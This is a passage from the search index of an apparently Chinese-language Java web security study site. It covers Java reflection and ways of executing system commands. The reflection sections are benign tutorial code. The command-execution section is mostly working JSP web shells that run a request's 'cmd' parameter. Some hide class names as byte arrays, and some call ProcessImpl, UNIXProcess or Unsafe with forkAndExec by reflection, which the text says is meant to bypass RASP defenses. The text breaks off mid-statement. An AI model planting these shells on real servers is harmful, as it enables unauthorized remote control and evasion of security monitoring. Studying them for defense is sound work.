forName ( \"[[Ljava.lang.String;\" ); // \u76f8\u5f53\u4e8eString[][].class \u53cd\u5c04\u83b7\u53d6java.lang.Runtime # package top.longlone ; import sun.misc.IOUtils ; import java.io.InputStream ; import java.lang.reflect.Constructor ; import java.lang.reflect.Method ; public class ReflectionStudy { public static void main ( String [] args ) throws Exception { // \u53cd\u5c04\u83b7\u53d6Runtime\u7c7b Class <?> runtimeClass = Class . forName ( \"java.lang.Runtime\" ); // \u53cd\u5c04\u83b7\u53d6\u7c7b\u7684\u6784\u9020\u5668\uff0c\u56e0\u4e3a\u5b83\u662f\u79c1\u6709\u7684\u6240\u4ee5\u8981\u8bbe\u7f6eAccessible Constructor <?> constructor = runtimeClass . getDeclaredConstructor (); constructor . setAccessible ( true ); // \u83b7\u53d6Runtime\u5b9e\u4f8b Object runtimeInstance = constructor . newInstance (); // \u83b7\u53d6exec\u65b9\u6cd5 Method exec = runtimeClass . getMethod ( \"exec\" , String . class ); // \u53cd\u5c04\u8c03\u7528exec\u65b9\u6cd5\u5e76\u83b7\u53d6\u7ed3\u679c Process process = ( Process ) exec . invoke ( runtimeInstance , \"whoami\" ); InputStream inputStream = process . getInputStream (); System . out . println ( new String ( IOUtils . readAllBytes ( inputStream ))); } } \u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5 # \u83b7\u53d6\u6210\u5458\u65b9\u6cd5 # \u83b7\u53d6\u5f53\u524d\u7c7b\u6240\u6709\u7684\u6210\u5458\u65b9\u6cd5\uff1a Method [] methods = clazz . getDeclaredMethods () \u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u65b9\u6cd5\uff1a Method method = clazz . getDeclaredMethod ( \"\u65b9\u6cd5\u540d\" ); Method method = clazz . getDeclaredMethod ( \"\u65b9\u6cd5\u540d\" , \u53c2\u6570\u7c7b\u578b\u5982String . class \uff0c \u591a\u4e2a\u53c2\u6570\u7528 \",\" \u53f7\u9694\u5f00 ); getMethod\u4e0egetDeclaredMethod\u7684\u533a\u522b # getMethod \u80fd\u83b7\u53d6 \u5f53\u524d\u7c7b\u548c\u7236\u7c7b \u7684\u6240\u6709\u6709\u6743\u9650\u65b9\u6cd5\uff08\u5982public\uff09 getDeclaredMethod \u80fd\u83b7\u53d6 \u5f53\u524d\u7c7b \u7684\u6240\u6709\u65b9\u6cd5 \u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5 # method . invoke ( \u65b9\u6cd5\u5b9e\u4f8b\u5bf9\u8c61 , \u65b9\u6cd5\u53c2\u6570\u503c \uff0c \u591a\u4e2a\u53c2\u6570\u503c\u7528 \",\" \u9694\u5f00 ); \u53cd\u5c04\u83b7\u53d6\u548c\u4fee\u6539\u5c5e\u6027 # \u83b7\u53d6\u5f53\u524d\u7c7b\u7684\u6240\u6709\u6210\u5458\u53d8\u91cf # Field fields = clazz . getDeclaredFields (); \u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u53d8\u91cf # Field field = clazz . getDeclaredField ( \"\u53d8\u91cf\u540d\" ); getField \u548c getDeclaredField \u7684\u533a\u522b\u540c getMethod \u548c getDeclaredMethod \u83b7\u53d6\u6210\u5458\u53d8\u91cf\u503c # Object obj = field . get ( \u7c7b\u5b9e\u4f8b\u5bf9\u8c61 ); \u4fee\u6539\u6210\u5458\u53d8\u91cf\u503c # field . set ( \u7c7b\u5b9e\u4f8b\u5bf9\u8c61 , \u4fee\u6539\u540e\u7684\u503c ); \u793a\u4f8b # package top.longlone ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; class NumberTest { private Integer number ; public NumberTest () { number = 1 ; } public void display () { System . out . println ( \"Number is \" + number ); } } public class ReflectionStudy { public static void main ( String [] args ) throws Exception { // \u83b7\u53d6NumberTest\u7c7b Class <?> testClass = Class . forName ( \"top.longlone.NumberTest\" ); // \u83b7\u53d6NumberTest\u4e2d\u7684number\u5c5e\u6027\u5e76\u8bbe\u7f6e\u53ef\u8bbf\u95ee\uff08\u56e0\u4e3a\u662f\u79c1\u6709\u7684\uff09 Field numberField = testClass . getDeclaredField ( \"number\" ); numberField . setAccessible ( true ); // \u83b7\u53d6NumberTest\u6784\u9020\u5668 Constructor <?> testConstructor = testClass . getConstructor (); // \u83b7\u53d6NumberTest\u5b9e\u4f8b NumberTest testInstance = ( NumberTest ) testConstructor . newInstance (); // \u83b7\u53d6\u5b9e\u4f8b\u4e2d\u7684number\u5c5e\u6027\u503c\uff0c\u6b64\u65f6\u4e3a1 Integer number = ( Integer ) numberField . get ( testInstance ); // \u8bbe\u7f6e\u5b9e\u4f8b\u4e2d\u7684number\u5c5e\u6027\u503c\u4e3a\u539f\u6765\u7684+1 numberField . set ( testInstance , number + 1 ); // \u8f93\u51fa\u7ed3\u679c\uff0c\u4e3a2 testInstance . display (); } }","title":"java\u53cd\u5c04\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#java\u53cd\u5c04\u673a\u5236","text":"\u901a\u8fc7java\u53cd\u5c04\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u52a8\u6001\u5730\u83b7\u53d6\u4ee5\u4e0b\u4e1c\u897f\uff1a - \u7c7b - \u5b9e\u4f8b - \u65b9\u6cd5\uff0c\u8c03\u7528\u65b9\u6cd5 - \u5c5e\u6027\uff0c\u5c5e\u6027\u503c - ...","title":"java\u53cd\u5c04\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6class\u5bf9\u8c61","text":"\u6709\u4e09\u79cd\u65b9\u6cd5\u83b7\u53d6Class\u5bf9\u8c61\uff1a 1. \u7c7b\u540d.class 2. Class.forName(\"\") 3. classLoader.loadClass(\"\"); \u83b7\u53d6\u6570\u7ec4\u7c7b\u578b\u7684Class\u5bf9\u8c61\u6bd4\u8f83\u7279\u6b8a\uff1a Class <?> doubleArray = Class . forName ( \"[D\" ); //\u76f8\u5f53\u4e8edouble[].class Class <?> cStringArray = Class . forName ( \"[[Ljava.lang.String;\" ); // \u76f8\u5f53\u4e8eString[][].class","title":"\u83b7\u53d6Class\u5bf9\u8c61"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u53cd\u5c04\u83b7\u53d6javalangruntime","text":"package top.longlone ; import sun.misc.IOUtils ; import java.io.InputStream ; import java.lang.reflect.Constructor ; import java.lang.reflect.Method ; public class ReflectionStudy { public static void main ( String [] args ) throws Exception { // \u53cd\u5c04\u83b7\u53d6Runtime\u7c7b Class <?> runtimeClass = Class . forName ( \"java.lang.Runtime\" ); // \u53cd\u5c04\u83b7\u53d6\u7c7b\u7684\u6784\u9020\u5668\uff0c\u56e0\u4e3a\u5b83\u662f\u79c1\u6709\u7684\u6240\u4ee5\u8981\u8bbe\u7f6eAccessible Constructor <?> constructor = runtimeClass . getDeclaredConstructor (); constructor . setAccessible ( true ); // \u83b7\u53d6Runtime\u5b9e\u4f8b Object runtimeInstance = constructor . newInstance (); // \u83b7\u53d6exec\u65b9\u6cd5 Method exec = runtimeClass . getMethod ( \"exec\" , String . class ); // \u53cd\u5c04\u8c03\u7528exec\u65b9\u6cd5\u5e76\u83b7\u53d6\u7ed3\u679c Process process = ( Process ) exec . invoke ( runtimeInstance , \"whoami\" ); InputStream inputStream = process . getInputStream (); System . out . println ( new String ( IOUtils . readAllBytes ( inputStream ))); } }","title":"\u53cd\u5c04\u83b7\u53d6java.lang.Runtime"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5","text":"","title":"\u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6\u6210\u5458\u65b9\u6cd5","text":"\u83b7\u53d6\u5f53\u524d\u7c7b\u6240\u6709\u7684\u6210\u5458\u65b9\u6cd5\uff1a Method [] methods = clazz . getDeclaredMethods () \u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u65b9\u6cd5\uff1a Method method = clazz . getDeclaredMethod ( \"\u65b9\u6cd5\u540d\" ); Method method = clazz . getDeclaredMethod ( \"\u65b9\u6cd5\u540d\" , \u53c2\u6570\u7c7b\u578b\u5982String . class \uff0c \u591a\u4e2a\u53c2\u6570\u7528 \",\" \u53f7\u9694\u5f00 );","title":"\u83b7\u53d6\u6210\u5458\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#getmethod\u4e0egetdeclaredmethod\u7684\u533a\u522b","text":"getMethod \u80fd\u83b7\u53d6 \u5f53\u524d\u7c7b\u548c\u7236\u7c7b \u7684\u6240\u6709\u6709\u6743\u9650\u65b9\u6cd5\uff08\u5982public\uff09 getDeclaredMethod \u80fd\u83b7\u53d6 \u5f53\u524d\u7c7b \u7684\u6240\u6709\u65b9\u6cd5","title":"getMethod\u4e0egetDeclaredMethod\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5_1","text":"method . invoke ( \u65b9\u6cd5\u5b9e\u4f8b\u5bf9\u8c61 , \u65b9\u6cd5\u53c2\u6570\u503c \uff0c \u591a\u4e2a\u53c2\u6570\u503c\u7528 \",\" \u9694\u5f00 );","title":"\u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u53cd\u5c04\u83b7\u53d6\u548c\u4fee\u6539\u5c5e\u6027","text":"","title":"\u53cd\u5c04\u83b7\u53d6\u548c\u4fee\u6539\u5c5e\u6027"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6\u5f53\u524d\u7c7b\u7684\u6240\u6709\u6210\u5458\u53d8\u91cf","text":"Field fields = clazz . getDeclaredFields ();","title":"\u83b7\u53d6\u5f53\u524d\u7c7b\u7684\u6240\u6709\u6210\u5458\u53d8\u91cf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u53d8\u91cf","text":"Field field = clazz . getDeclaredField ( \"\u53d8\u91cf\u540d\" ); getField \u548c getDeclaredField \u7684\u533a\u522b\u540c getMethod \u548c getDeclaredMethod","title":"\u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u53d8\u91cf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6\u6210\u5458\u53d8\u91cf\u503c","text":"Object obj = field . get ( \u7c7b\u5b9e\u4f8b\u5bf9\u8c61 );","title":"\u83b7\u53d6\u6210\u5458\u53d8\u91cf\u503c"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u4fee\u6539\u6210\u5458\u53d8\u91cf\u503c","text":"field . set ( \u7c7b\u5b9e\u4f8b\u5bf9\u8c61 , \u4fee\u6539\u540e\u7684\u503c );","title":"\u4fee\u6539\u6210\u5458\u53d8\u91cf\u503c"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u793a\u4f8b","text":"package top.longlone ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; class NumberTest { private Integer number ; public NumberTest () { number = 1 ; } public void display () { System . out . println ( \"Number is \" + number ); } } public class ReflectionStudy { public static void main ( String [] args ) throws Exception { // \u83b7\u53d6NumberTest\u7c7b Class <?> testClass = Class . forName ( \"top.longlone.NumberTest\" ); // \u83b7\u53d6NumberTest\u4e2d\u7684number\u5c5e\u6027\u5e76\u8bbe\u7f6e\u53ef\u8bbf\u95ee\uff08\u56e0\u4e3a\u662f\u79c1\u6709\u7684\uff09 Field numberField = testClass . getDeclaredField ( \"number\" ); numberField . setAccessible ( true ); // \u83b7\u53d6NumberTest\u6784\u9020\u5668 Constructor <?> testConstructor = testClass . getConstructor (); // \u83b7\u53d6NumberTest\u5b9e\u4f8b NumberTest testInstance = ( NumberTest ) testConstructor . newInstance (); // \u83b7\u53d6\u5b9e\u4f8b\u4e2d\u7684number\u5c5e\u6027\u503c\uff0c\u6b64\u65f6\u4e3a1 Integer number = ( Integer ) numberField . get ( testInstance ); // \u8bbe\u7f6e\u5b9e\u4f8b\u4e2d\u7684number\u5c5e\u6027\u503c\u4e3a\u539f\u6765\u7684+1 numberField . set ( testInstance , number + 1 ); // \u8f93\u51fa\u7ed3\u679c\uff0c\u4e3a2 testInstance . display (); } }","title":"\u793a\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","tags":["java","java\u5b89\u5168"],"text":"java\u547d\u4ee4\u6267\u884c # Runtime\u547d\u4ee4\u6267\u884c # Runtime.exec \u6267\u884c\u903b\u8f91 1. Runtime.exec(xxx) 2. java.lang.ProcessBuilder.start() 3. new java.lang.UNIXProcess(xxx) 4. UNIXProcess \u6784\u9020\u65b9\u6cd5\u4e2d\u8c03\u7528\u4e86 forkAndExec(xxx) native\u65b9\u6cd5\u3002 5. forkAndExec \u8c03\u7528\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u522b fork -> exec (*nix)/ CreateProcess (Windows)\u6267\u884c\u547d\u4ee4\u5e76\u8fd4\u56de fork / CreateProcess \u7684 PID // \u4e00\u53e5\u8bdd\u547d\u4ee4\u6267\u884cjsp\u6728\u9a6c(\u65e0\u56de\u663e) <%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%> // \u547d\u4ee4\u6267\u884cjsp\u6728\u9a6c(\u6709\u56de\u663e) ?cmd=\u547d\u4ee4 <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <%@ page import=\"java.io.InputStream\" %> <% String cmd = request.getParameter(\"cmd\"); if (cmd != null) { // InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); InputStream in = new ProcessBuilder(cmd).start().getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } out.write(\"<pre>\" + new String(baos.toByteArray()) + \"</pre>\"); } %> // \u53cd\u5c04Runtime\u547d\u4ee4\u6267\u884c <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.InputStream\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%@ page import=\"java.util.Scanner\" %> <% String str = request.getParameter(\"str\"); // \u5b9a\u4e49\"java.lang.Runtime\"\u5b57\u7b26\u4e32\u53d8\u91cf String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}); // \u53cd\u5c04java.lang.Runtime\u7c7b\u83b7\u53d6Class\u5bf9\u8c61 Class<?> c = Class.forName(rt); // \u53cd\u5c04\u83b7\u53d6Runtime\u7c7b\u7684getRuntime\u65b9\u6cd5 Method m1 = c.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})); // \u53cd\u5c04\u83b7\u53d6Runtime\u7c7b\u7684exec\u65b9\u6cd5 Method m2 = c.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class); // \u53cd\u5c04\u8c03\u7528Runtime.getRuntime().exec(xxx)\u65b9\u6cd5 Object obj2 = m2.invoke(m1.invoke(null, new Object[]{}), new Object[]{str}); // \u53cd\u5c04\u83b7\u53d6Process\u7c7b\u7684getInputStream\u65b9\u6cd5 Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109})); m.setAccessible(true); // \u83b7\u53d6\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u7684\u8f93\u5165\u6d41\u5bf9\u8c61\uff1ap.getInputStream()\u5e76\u4f7f\u7528Scanner\u6309\u884c\u5207\u5272\u6210\u5b57\u7b26\u4e32 Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]{})).useDelimiter(\"\\\\A\"); String result = s.hasNext() ? s.next() : \"\"; // \u8f93\u51fa\u547d\u4ee4\u6267\u884c\u7ed3\u679c out.println(result); %> ProcessBuilder\u547d\u4ee4\u6267\u884c # Runtime.exec \u6700\u7ec8\u4f1a\u8c03\u7528 ProcessBuilder \u6267\u884c\u7cfb\u7edf\u547d\u4ee4,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 ProcessBuilder \u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u4f7f\u7528 ProcessBuilder \u53ef\u4ee5\u5b9e\u73b0\u6267\u884c\u6bd4\u8f83\u590d\u6742\u7684\u7cfb\u7edf\u547d\u4ee4 // windows\u4e0b\u53ef\u4ee5\u5c1d\u8bd5\u6267\u884c cmd=cmd.exe&cmd=/c&cmd=whoami // linux\u4e0b\u53ef\u4ee5\u5c1d\u8bd5\u6267\u884c cmd=/bin/sh&cmd=-c&cmd=cd%20/Users/;ls%20-la <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <%@ page import=\"java.io.InputStream\" %> <% InputStream in = new ProcessBuilder(request.getParameterValues(\"cmd\")).start().getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while((a=in.read(b)) != -1) { baos.write(b,0,a); } out.write(\"<p>\" + new String(baos.toByteArray()) + \"</p>\"); %> \u53cd\u5c04UNIXProcess/ProcessImpl\u547d\u4ee4\u6267\u884c # UNIXProcess \u548c ProcessImpl \u53ef\u4ee5\u7406\u89e3\u672c\u5c31\u662f\u4e00\u4e2a\u4e1c\u897f,\u5728JDK9\u7684\u65f6\u5019\u628a UNIXProcess \u5408\u5e76\u5230\u4e86 ProcessImpl UNIXProcess \u548c ProcessImpl \u5176\u5b9e\u5c31\u662f\u6700\u7ec8\u8c03\u7528 native \u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53eb forkAndExec \u7684 native \u65b9\u6cd5\uff0c\u5982\u65b9\u6cd5\u540d\u6240\u8ff0\u4e3b\u8981\u662f\u901a\u8fc7 fork&exec \u6765\u6267\u884c\u672c\u5730\u7cfb\u7edf\u547d\u4ee4 \u5229\u7528\u8fd9\u4e2a\u66f4\u52a0\u5e95\u5c42\u7684 UNIXProcess/ProcessImpl \u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u53ef\u4ee5\u5c1d\u8bd5\u7ed5\u8fc7RASP // \u53cd\u5c04UNIXProcess/ProcessImpl\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 // windows\u4e0b\u53cd\u5c04ProcessImpl \u8c03\u7528start\u65b9\u6cd5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4,start\u65b9\u6cd5\u5b9e\u8d28\u662f\u521b\u5efa\u4e86\u4e00\u4e2aProcessImpl\u7684\u5b9e\u4f8b <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.InputStream\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%@ page import=\"java.util.Map\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <% String[] cmd = request.getParameterValues(\"cmd\"); if (cmd != null) { Class<?> clazz = Class.forName(\"java.lang.ProcessImpl\"); Method method = clazz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); Process p = (Process) method.invoke(null, cmd, null, \".\", null, true); InputStream in = p.getInputStream(); byte[] b = new byte[1024]; int a = -1; ByteArrayOutputStream baos = new ByteArrayOutputStream(); while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } out.write(\"<p>\" + baos.toString() + \"</p>\"); } %> // windows\u4e0b\u53cd\u5c04ProcessImpl\u65b0\u5efa\u5b9e\u4f8b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.InputStream\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%@ page import=\"java.util.Map\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <% String[] cmd = request.getParameterValues(\"cmd\"); if (cmd != null) { Class<?> clazz = Class.forName(\"java.lang.ProcessImpl\"); Constructor<?> constructor = clazz.getDeclaredConstructors()[0]; constructor.setAccessible(true); Object object = constructor.newInstance(cmd, null, \".\", new long[]{0}, true); } %> // \u7c7bunix\u4e0b\u53cd\u5c04UNIXProcess/ProcessImpl\u6784\u9020\u5b9e\u4f8b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"java.io.*\" %> <%@ page import=\"java.lang.reflect.Constructor\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%! byte[] toCString(String s) { if (s == null) { return null; } byte[] bytes = s.getBytes(); byte[] result = new byte[bytes.length + 1]; System.arraycopy(bytes, 0, result, 0, bytes.length); result[result.length - 1] = (byte) 0; return result; } InputStream start(String[] strs) throws Exception { // java.lang.UNIXProcess String unixClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115}); // java.lang.ProcessImpl String processClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108}); Class clazz = null; // \u53cd\u5c04\u521b\u5efaUNIXProcess\u6216\u8005ProcessImpl try { clazz = Class.forName(unixClass); } catch (ClassNotFoundException e) { clazz = Class.forName(processClass); } // \u83b7\u53d6UNIXProcess\u6216\u8005ProcessImpl\u7684\u6784\u9020\u65b9\u6cd5 Constructor<?> constructor = clazz.getDeclaredConstructors()[0]; constructor.setAccessible(true); assert strs != null && strs.length > 0; // Convert arguments to a contiguous block; it's easier to do // memory management in Java than in C. byte[][] args = new byte[strs.length - 1][]; int size = args.length; // For added NUL bytes for (int i = 0; i < args.length; i++) { args[i] = strs[i + 1].getBytes(); size += args[i].length; } byte[] argBlock = new byte[size]; int i = 0; for (byte[] arg : args) { System.arraycopy(arg, 0, argBlock, i, arg.length); i += arg.length + 1; // No need to write NUL bytes explicitly } int[] envc = new int[1]; int[] std_fds = new int[]{-1, -1, -1}; FileInputStream f0 = null; FileOutputStream f1 = null; FileOutputStream f2 = null; // In theory, close() can throw IOException // (although it is rather unlikely to happen here) try { if (f0 != null) f0.close(); } finally { try { if (f1 != null) f1.close(); } finally { if (f2 != null) f2.close(); } } // \u521b\u5efaUNIXProcess\u6216\u8005ProcessImpl\u5b9e\u4f8b Object object = constructor.newInstance( toCString(strs[0]), argBlock, args.length, null, envc[0], null, std_fds, false ); // \u83b7\u53d6\u547d\u4ee4\u6267\u884c\u7684InputStream Method inMethod = object.getClass().getDeclaredMethod(\"getInputStream\"); inMethod.setAccessible(true); return (InputStream) inMethod.invoke(object); } String inputStreamToString(InputStream in, String charset) throws IOException { try { if (charset == null) { charset = \"UTF-8\"; } ByteArrayOutputStream out = new ByteArrayOutputStream(); int a = 0; byte[] b = new byte[1024]; while ((a = in.read(b)) != -1) { out.write(b, 0, a); } return new String(out.toByteArray()); } catch (IOException e) { throw e; } finally { if (in != null) in.close(); } } %> <% String[] str = request.getParameterValues(\"cmd\"); if (str != null) { InputStream in = start(str); String result = inputStreamToString(in, \"UTF-8\"); out.println(\"<pre>\"); out.println(result); out.println(\"</pre>\"); out.flush(); out.close(); } %> forkAndExec\u547d\u4ee4\u6267\u884c-Unsafe+\u53cd\u5c04+Native\u65b9\u6cd5\u8c03\u7528 # \u5982\u679c RASP \u628a UNIXProcess/ProcessImpl \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u62e6\u622a,\u53ef\u4ee5\u901a\u8fc7 Unsafe.allocateInstance \u6765\u8fdb\u884c\u7ed5\u8fc7,\u5177\u4f53\u6b65\u9aa4\u662f 1. \u4f7f\u7528 sun.misc.Unsafe.allocateInstance(Class) \u7279\u6027\u53ef\u4ee5\u65e0\u9700 new \u6216\u8005 newInstance \u521b\u5efa UNIXProcess/ProcessImpl \u7c7b\u5bf9\u8c61 2. \u53cd\u5c04 UNIXProcess/ProcessImpl \u7c7b\u7684 forkAndExec \u65b9\u6cd5 3. \u6784\u9020 forkAndExec \u9700\u8981\u7684\u53c2\u6570\u5e76\u8c03\u7528 4. \u53cd\u5c04 UNIXProcess/ProcessImpl \u7c7b\u7684 initStreams \u65b9\u6cd5\u521d\u59cb\u5316\u8f93\u5165\u8f93\u51fa\u7ed3\u679c\u6d41\u5bf9\u8c61 5. \u53cd\u5c04 UNIXProcess/ProcessImpl \u7c7b\u7684 getInputStream \u65b9\u6cd5\u83b7\u53d6\u672c\u5730\u547d\u4ee4\u6267\u884c\u7ed3\u679c(\u5982\u679c\u8981\u8f93\u51fa\u6d41\u3001\u5f02\u5e38\u6d41\u53cd\u5c04\u5bf9\u5e94\u65b9\u6cd5\u5373\u53ef) // \u7c7bUnix\u4e0b <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"sun.misc.Unsafe\" %> <%@ page import=\"java.io.ByteArrayOutputStream\" %> <%@ page import=\"java.io.InputStream\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"java.lang.reflect.Method\" %> <%! byte[] toCString(String s) { if (s == null) return null; byte[] bytes = s.getBytes(); byte[] result = new byte[bytes.length + 1]; System.arraycopy(bytes, 0, result, 0, bytes.length); result[result.length - 1] = (byte) 0; return result; } %> <% String[] strs = request.getParameterValues(\"cmd\"); if (strs != null) { Field theUnsafeField = Unsafe.class.getDeclaredField(\"theUnsafe\"); theUnsafeField.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafeField.get(null); Class processClass = null; try { processClass = Class.forName(\"java.lang.UNIXProcess\"); } catch (ClassNotFoundException e) { processClass = Class.forName(\"java.lang.ProcessImpl\"); } Object processObject = unsafe.allocateInstance(processClass); // Convert arguments to a contiguous block; it's easier to do // memory management in Java than in C. byte[][] args = new byte[strs.length - 1][]; int size = args.length; // For added NUL bytes for (int i = 0; i < args.length; i++) { args[i] = strs[i + 1].getBytes(); size += args[i].length; } byte[] argBlock = new byte[size]; int i = 0; for (byte[] arg : args) { System.arraycopy(arg, 0, argBlock, i, arg.length); i += arg.length + 1; // No need to write NUL bytes explicitly } int[] envc = new int[1]; int[] std_fds = new int[]{-1, -1, -1}; Field launchMechanismField = processClass.getDeclaredField(\"launchMechanism\"); Field helperpathField = processClass.getDeclaredField(\"helperpath\"); launchMechanismField.setAccessible(true); helperpathField.setAccessible(true); Object launchMechanismObject = launchMechanismField.get(processObject); byte[] helperpathObject = (byte[]) helperpathField.get(processObject); int ordinal = (int) launchMechanismObject.getClass().getMethod(\"ordinal\").invoke(launchMechanismObject); Method forkMethod = processClass.getDeclaredMethod(\"forkAndExec\", new Class[]{ int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class }); forkMethod.setAccessible(true);// \u8bbe\u7f6e\u8bbf\u95ee\u6743\u9650 int pid = (int) 